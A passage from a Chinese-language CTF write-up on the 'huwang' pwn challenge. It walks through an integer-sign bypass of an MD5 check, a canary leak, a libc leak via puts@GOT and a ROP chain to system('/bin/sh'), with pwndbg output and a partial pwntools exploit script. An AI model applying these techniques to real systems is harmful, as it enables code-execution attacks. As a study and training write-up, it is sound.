class="line">已打开文件状态标志</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里由于IDA显示的是多个flags选项相或的值，我们可以通过constgrep命令查看每个flags选项的的值，并进行计算，确定所用的flags选项。</p><p>&emsp;&emsp;程序首先通过open()创建只写文件/tmp/secret，并赋予777权限。然后从/dev/urandom读出12个字节随机数，处理后存入/tmp/secret文件，并关闭文件。然后在执行MD5加密前，以flags:O_TRUNC(0x200)|O_WRONLY(0x01)调用open()函数，将/tmp/secret文件清空，对处理后的随机数执行MD5加密后，将MD5加密后的结果存入/tmp/secret文件。然后让我们猜加密后的MD5值，猜对了进入存在明显溢出漏洞的cmp_md5_true函数。</p><p>&emsp;&emsp;我们这里需要绕过MD5值对比的验证，进入漏洞函数进行利用。对随机数进行MD5加密的次数，是由用户控制的，由于程序只判断了加密次数大于10和等于0的情况，所以这里可以通过输入-1进行绕过。当我们输入-1时，在进行加密次数判断时，v2(无符号)与encrypt_num(有符号)比较时，-1会变成一个很大的数，致使程序一直处于加密循环中，造成程序运行超时退出，时间为一分钟。导致/tmp/secret文件为空，这是我们再开一个交互，就可以预测MD5的值了，由于文件为空，所以被加密的明文为”\x00”*16,我们通过hashlib算出”\x00”*16的MD5值，即可绕过验证。</p><p>下面是一些调试过程:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、创建完/tmp/secret后，文件描述符值</span><br><span class="line">   <span class="number">0x4011dc</span>    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line">   <span class="number">0x4011e1</span>    <span class="keyword">call</span>   <span class="number">0x400b40</span>HIDWORD(v1) = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x41</span>, 0777LL)<span class="comment">;</span></span><br><span class="line"> </span><br><span class="line"> ► <span class="number">0x4011e6</span>    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x7c</span>], <span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x4011e9</span>    <span class="keyword">mov</span>    <span class="built_in">esi</span>, <span class="number">0</span></span><br><span class="line">   <span class="number">0x4011ee</span>    <span class="keyword">mov</span>    <span class="built_in">edi</span>, <span class="number">0x4019cd</span></span><br><span class="line">*<span class="built_in">RAX</span>  <span class="number">0x3</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、看看程序对从/dev/unrandom读出的随机数做了什么</span><br><span class="line">   <span class="number">0x401216</span>    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x80</span>], <span class="number">0</span></span><br><span class="line"> ► <span class="number">0x40121d</span>    <span class="keyword">jmp</span>    <span class="number">0x40123b</span></span><br><span class="line">pwndbg&gt; <span class="built_in">dq</span> <span class="built_in">rbp</span>-<span class="number">0x80</span></span><br><span class="line">00007fffffffdc80     <span class="number">0000000300000000</span> 00007fff00000004</span><br><span class="line">00007fffffffdc90     <span class="number">0000000000000079</span> <span class="number">0000000000000000</span></span><br><span class="line">00007fffffffdca0     b563b8cc0cfde998 00000000f9684b16</span><br><span class="line">00007fffffffdcb0     00007fffffffddf0 <span class="number">0000000000000000</span></span><br><span class="line"></span><br><span class="line">while ( v1 &lt;= <span class="number">11</span> )                        // 有符号v1与<span class="number">0xB</span>，比较，小于<span class="number">0xB</span>则执行while循环，处理随机数</span><br><span class="line">&#123;</span><br><span class="line">  s[v1] &amp;= 1u<span class="comment">;</span></span><br><span class="line">  LODWORD(v1) = v1 + <span class="number">1</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">执行上一段代码前：s[<span class="number">32</span>]</span><br><span class="line">pwndbg&gt; <span class="built_in">db</span> <span class="built_in">rbp</span>-<span class="number">0x60</span></span><br><span class="line">00007fffffffdca0     <span class="number">98</span> e9 fd 0c cc b8 <span class="number">63</span> b5 <span class="number">16</span> 4b <span class="number">68</span> f9 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">00007fffffffdcb0     f0 <span class="built_in">dd</span> ff ff ff 7f <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">执行上一段代码后：s[<span class="number">32</span>]</span><br><span class="line">pwndbg&gt; <span class="built_in">db</span> <span class="built_in">rbp</span>-<span class="number">0x60</span></span><br><span class="line">00007fffffffdca0     <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span>| <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">00007fffffffdcb0     f0 <span class="built_in">dd</span> ff ff ff 7f <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">这段代码使读出的随机数每个字节的高<span class="number">7</span>位为<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、将处理后的随机数写入/tmp/secret</span><br><span class="line">   <span class="number">0x401245</span>    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x7c</span>]</span><br><span class="line">   <span class="number">0x401248</span>    <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="number">0xc</span></span><br><span class="line">   <span class="number">0x40124d</span>    <span class="keyword">mov</span>    <span class="built_in">rsi</span>, <span class="built_in">rcx</span></span><br><span class="line">   <span class="number">0x401250</span>    <span class="keyword">mov</span>    <span class="built_in">edi</span>, <span class="built_in">eax</span></span><br><span class="line"> ► <span class="number">0x401252</span>    <span class="keyword">call</span>   <span class="number">0x400b38</span>write(SHIDWORD(v1), s, 12uLL)<span class="comment">;</span></span><br><span class="line">pwndbg&gt; dumpargs --force</span><br><span class="line"> <span class="built_in">rdi</span> = <span class="number">0x3</span> /tmp/secret</span><br><span class="line"> <span class="built_in">rsi</span> = <span class="number">0x7fffffffdca0</span> ◂— <span class="number">0x101000000010100</span>  随机数</span><br><span class="line"> <span class="built_in">rdx</span> = <span class="number">0xc</span></span><br><span class="line"> <span class="built_in">rcx</span> = <span class="number">0x7fffffffdca0</span> ◂— <span class="number">0x101000000010100</span></span><br><span class="line">  <span class="built_in">r8</span> = <span class="number">0x7ffff7fd3700</span> ◂— <span class="number">0x7ffff7fd3700</span></span><br><span class="line">  <span class="built_in">r9</span> = <span class="number">0x1999999999999999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、看看第二次打开/tmp/secret时的文件描述符的值</span><br><span class="line">   <span class="number">0x40126b</span>    <span class="keyword">mov</span>    <span class="built_in">esi</span>, <span class="number">0</span></span><br><span class="line">   <span class="number">0x401270</span>    <span class="keyword">mov</span>    <span class="built_in">edi</span>, <span class="number">0x4019c1</span></span><br><span class="line">   <span class="number">0x401275</span>    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"> ► <span class="number">0x40127a</span>    <span class="keyword">call</span>   <span class="number">0x400b40</span>v0 = open(<span class="string">"/tmp/secret"</span>, <span class="number">0</span>, v1)<span class="comment">;</span></span><br><span class="line">pwndbg&gt; dumpargs --force</span><br><span class="line"> <span class="built_in">rdi</span> = <span class="number">0x4019c1</span> ◂— <span class="string">'/tmp/secret'</span></span><br><span class="line"> <span class="built_in">rsi</span> = <span class="number">0x0</span></span><br><span class="line"> <span class="built_in">rdx</span> = <span class="number">0xc</span></span><br><span class="line"> <span class="built_in">rcx</span> = <span class="number">0x7ffff76c08f0</span> (__close_nocancel+<span class="number">7</span>) ◂— <span class="keyword">cmp</span>    <span class="built_in">rax</span>, -<span class="number">0xfff</span></span><br><span class="line">  <span class="built_in">r8</span> = <span class="number">0x7ffff7fd3700</span> ◂— <span class="number">0x7ffff7fd3700</span></span><br><span class="line">  <span class="built_in">r9</span> = <span class="number">0x1999999999999999</span></span><br><span class="line">*<span class="built_in">RAX</span>  <span class="number">0x3</span> 和第一次打开的文件描述符一样？前一个文件描述符已经关闭了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、看看第三次打开/tmp/secret时的文件描述符的值</span><br><span class="line"> ► <span class="number">0x401303</span>    <span class="keyword">call</span>   <span class="number">0x400b40</span>HIDWORD(v2) = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x201</span>)<span class="comment">; </span></span><br><span class="line"> pwndbg&gt; dumpargs --force</span><br><span class="line"> <span class="built_in">rdi</span> = <span class="number">0x4019c1</span> ◂— <span class="string">'/tmp/secret'</span></span><br><span class="line"> <span class="built_in">rsi</span> = <span class="number">0x201</span></span><br><span class="line"> <span class="built_in">rdx</span> = <span class="number">0x0</span></span><br><span class="line"> <span class="built_in">rcx</span> = <span class="number">0x7fffffffdc51</span> ◂— <span class="number">0xfa00000000000031</span> /* <span class="string">'1'</span> */</span><br><span class="line">  <span class="built_in">r8</span> = <span class="number">0x0</span></span><br><span class="line">  <span class="built_in">r9</span> = <span class="number">0x1999999999999999</span></span><br><span class="line">*<span class="built_in">RAX</span>  <span class="number">0x3</span> 依旧是<span class="number">3</span>，因为前面两次都关闭了文件描述符</span><br><span class="line">文件描述符的值始终是当前可用的最小的值，<span class="number">0x00</span>、<span class="number">0x01</span>、<span class="number">0x02</span>分别被stdin、stdout、stderr占据，所以之前没有打开的文件时，当前打开的文件的文件描述符为<span class="number">0x03</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、查看保存文件描述符的变量的值</span><br><span class="line">   <span class="number">0x401308</span>    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x7c</span>], <span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x40130b</span>    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x80</span>], <span class="number">0</span></span><br><span class="line"> ► <span class="number">0x401312</span>    <span class="keyword">jmp</span>    <span class="number">0x40132d</span></span><br><span class="line">pwndbg&gt; <span class="built_in">dq</span> <span class="built_in">rbp</span>-<span class="number">0x80</span>v2=<span class="number">0x0000000300000000</span></span><br><span class="line">00007fffffffdc80     <span class="number">0000000300000000</span> ffffffff00000004</span><br><span class="line">00007fffffffdc90     <span class="number">0000000000000079</span> <span class="number">0000000000000000</span></span><br><span class="line">00007fffffffdca0     <span class="number">0101000000010100</span> <span class="number">0000000001000100</span></span><br><span class="line">00007fffffffdcb0     00007fffffffddf0 <span class="number">0000000000000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、当加密次数输入为-<span class="number">1</span>时，一直处于加密循环中</span><br><span class="line">   <span class="number">0x40132d</span>    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x80</span>]   v2</span><br><span class="line">   <span class="number">0x401330</span>    <span class="keyword">cmp</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x74</span>]   encrypt_nums</span><br><span class="line"> ► <span class="number">0x401333</span>  ✔ <span class="keyword">jb</span>     <span class="number">0x401314</span>(unsigned <span class="keyword">int</span>)v2 &lt; encrypt_nums</span><br><span class="line">pwndbg&gt; <span class="built_in">dd</span> <span class="built_in">rbp</span>-<span class="number">0x80</span>  v2=<span class="number">0x00000000</span></span><br><span class="line">00007fffffffdc80     <span class="number">00000000</span> <span class="number">00000003</span> <span class="number">00000004</span> ffffffff</span><br><span class="line">00007fffffffdc90     <span class="number">00000079</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">00007fffffffdca0     <span class="number">00010100</span> <span class="number">01010000</span> <span class="number">01000100</span> <span class="number">00000000</span></span><br><span class="line">00007fffffffdcb0     ffffddf0 00007fff <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">pwndbg&gt; <span class="built_in">dd</span> <span class="built_in">rbp</span>-<span class="number">0x74</span>  encrypt_nums=<span class="number">0xffffffff</span></span><br><span class="line">00007fffffffdc8c     ffffffff <span class="number">00000079</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">00007fffffffdc9c     <span class="number">00000000</span> <span class="number">00010100</span> <span class="number">01010000</span> <span class="number">01000100</span></span><br><span class="line">00007fffffffdcac     <span class="number">00000000</span> ffffddf0 00007fff <span class="number">00000000</span></span><br><span class="line">00007fffffffdcbc     <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> f75ffe90</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、canary</span><br><span class="line">option_666()</span><br><span class="line"> <span class="built_in">RBP</span>  <span class="number">0x7fffffffdd00</span> —▸ <span class="number">0x7fffffffdd10</span> —▸ <span class="number">0x401510</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line"> <span class="built_in">RSP</span>  <span class="number">0x7fffffffdc80</span> ◂— <span class="number">0x5000000</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">c:</span><span class="number">0060</span>│ <span class="built_in">rsi</span>  <span class="number">0x7fffffffdce0</span> ◂— <span class="number">0x4141414141414141</span> (<span class="string">'AAAAAAAA'</span>)</span><br><span class="line">... ↓</span><br><span class="line">0f:<span class="number">0078</span>│      <span class="number">0x7fffffffdcf8</span> ◂— <span class="number">0xac2fcd3b25ae0f00</span> &lt;&lt;canary</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│ <span class="built_in">rbp</span>  <span class="number">0x7fffffffdd00</span> —▸ <span class="number">0x7fffffffdd10</span> —▸ <span class="number">0x401510</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line"></span><br><span class="line">get_option_num()</span><br><span class="line">   <span class="number">0x400d47</span>    <span class="keyword">push</span>   <span class="built_in">rbp</span></span><br><span class="line">   <span class="number">0x400d48</span>    <span class="keyword">mov</span>    <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line">   <span class="number">0x400d4b</span>    <span class="keyword">sub</span>    <span class="built_in">rsp</span>, <span class="number">0x20</span></span><br><span class="line">   <span class="number">0x400d4f</span>    <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0x28</span>]</span><br><span class="line"> ► <span class="number">0x400d58</span>    <span class="keyword">mov</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">8</span>], <span class="built_in">rax</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdc68</span> ◂— <span class="number">0xac2fcd3b25ae0f00</span>  &lt;&lt;canary</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ <span class="built_in">rbp</span>  <span class="number">0x7fffffffdc70</span> —▸ <span class="number">0x7fffffffdd00</span> —▸ <span class="number">0x7fffffffdd10</span> —▸ <span class="number">0x401510</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line">得出一个结论，每次程序运行后，所有函数使用的canary值是一样的，以前我认为是不一样的。我没有做更多的验证，所以我也不是很确定对不对。</span><br><span class="line">还有就是都是从<span class="built_in">fs</span>：<span class="number">0x28</span>取canary。</span><br></pre></td></tr></table></figure><p>我们绕过了MD5验证，进入cmp_md5_true()函数看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">cmp_md5_true</span><span class="params">(__int64 name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// ST1B_1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-214h]</span></span><br><span class="line">  <span class="keyword">char</span> occupation; <span class="comment">// [rsp+20h] [rbp-210h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+120h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+228h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);                    <span class="comment">// canary</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Congratulations, %s guessed my secret!\n"</span>, name);<span class="comment">// leak canary</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"And I want to know someting about you, and introduce you to other people who guess the secret!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What`s your occupation?"</span>);</span><br><span class="line">  get_choose(&amp;occupation, <span class="number">255L</span>L);</span><br><span class="line">  v3 = <span class="built_in">snprintf</span>(</span><br><span class="line">         &amp;s,</span><br><span class="line">         <span class="number">0xFF</span>uLL,</span><br><span class="line">         <span class="string">"I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome........."</span></span><br><span class="line">         <span class="string">"................................................................................................."</span>,</span><br><span class="line">         name,</span><br><span class="line">         &amp;occupation);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Here is your introduce"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to edit you introduce by yourself[Y/N]"</span>);</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="string">'Y'</span> )</span><br><span class="line">    read(<span class="number">0</span>, &amp;s, v3 - <span class="number">1</span>);                        <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"The final presentation is as follows:%s\n"</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;当我们输入的名字长度为0x19字节时，就可以leak出canary,得到canary，我们就可以绕过canary保护机制，然后再利用ROP绕过NX,执行shellcode了。由于libc是开启PIE的，所以我们直接使用确定的函数地址，只能动态获得。我们通过调用cmp_md5_true()函数，传入参数为puts()函数的got表地址，因为之前已经调用过puts()函数了，所以可以直接打印出puts()函数的地址。然后我们就可以确定libc的基地址，从而获得system()的地址和/bin/sh的地址。获得shell。</p><h4 id="0x03-exp-2"><a href="#0x03-exp-2" class="headerlink" title="0x03 exp"></a>0x03 exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary =<span class="string">'./huwang'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">elf = ELF(<span class="string">'./huwang'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x401573</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">cmp_md5_true = <span class="number">0x40101C</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">option_666</span><span class="params">(io,name,guess,encrypt_num,md5_ciphertext,flag)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'command&gt;&gt; \n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'666'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'please input your name\n'</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">'Do you want to guess the secret?\n'</span>)</span><br><span class="line">    io.sendline(guess)</span><br><span class="line">    io.recvuntil(<span class="string">'Input how many rounds do you want to encrypt the secret:\n'</span>)</span><br><span class="line">    io.sendline(str(encrypt_num))</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        io.recvuntil(<span class="string">'Try to guess the md5 of the secret\n'</span>)</span><br><span class="line">        io.send(md5_ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug_remote</span><span class="params">(ip,port,breakpoint)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        io = process(<span class="string">'./huwang'</span>,env = &#123;<span class="string">'LD_PRELOAD'</span> : <span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">        <span class="comment"># gdb.attach(io,breakpoint)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_encrypt</span><span class="params">(plaintext)</span>:</span></span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(plaintext.encode())</span><br><span class="line">    ciphertext = md.hexdigest()</span><br><span class="line">    <span class="keyword">return</span> ciphertext.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    io1 = debug_remote(ip,port,<span class="string">''</span>)</span><br><span class="line">    option_666(io1,<span class="string">'Sp4n9x'</span>,<span class="string">'y'</span>,<span class="number">-1</span>,<span class="string">'Sp4n9x'</span>,<span class="number">0</span>)</span><br><span class="line">    io1.recvuntil(<span class="string">'timeout~\n'</span>)</span><br><span class="line"></span><br><span class="line">    io2 = debug_remote(ip,port,<span class="string">'b *0x040110D\nc'</span>)</span><br><span class="line">    md5_ciphertext = md5_encrypt(<span class="string">'\x00'</span>*<span class="number">16</span>)</span><br><span class="line">    option_666(io2,<span class="string">'Sp4n9x'</span>.rjust(<span class="number">0x19</span>,<span class="string">'A'</span>),<span class="string">'y'</span>,<span class="number">1</span>,md5_ciphertext,<span class="number">1</span>)</span><br><span class="line">    io2.recvuntil(<span class="string">'Sp4n9x'</span>.rjust(<span class="number">0x19</span>,<span class="string">'A'</span>))</span><br><span class="line">    <span class="comment"># gdb.attach(io2)</span></span><br><span class="line">    canary = u64(<span class="string">'\x00'</span> + io2.recvn(<span class="number">7</span>))</span><br><span class="line">    <span class="keyword">print</span> hex(canary)</span><br><span class="line">    io2.recvuntil(<span class="string">'What`s your occupation?\n'</span>)</span><br><span class="line">    io2.send(<span class="string">'A'</span>*<span class="number">0xff</span>)</span><br><span class="line">    io2.recvuntil(<span class="string">'Do you want to edit you introduce by yourself[Y/N]\n'</span>)</span><br><span class="line">    io2.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    stack status</span></span><br><span class="line"><span class="string">    0x4141414141414141</span></span><br><span class="line"><span class="string">    ........</span></span><br><span class="line"><span class="string">    0x0200cf560c7a0a41 &lt;- canary</span></span><br><span class="line"><span class="string">    0x0000000000000000 &lt;- rbp</span></span><br><span class="line"><span class="string">    0x0000000000401573 &lt;- pop rdi ; ret</span></span><br><span class="line"><span class="string">    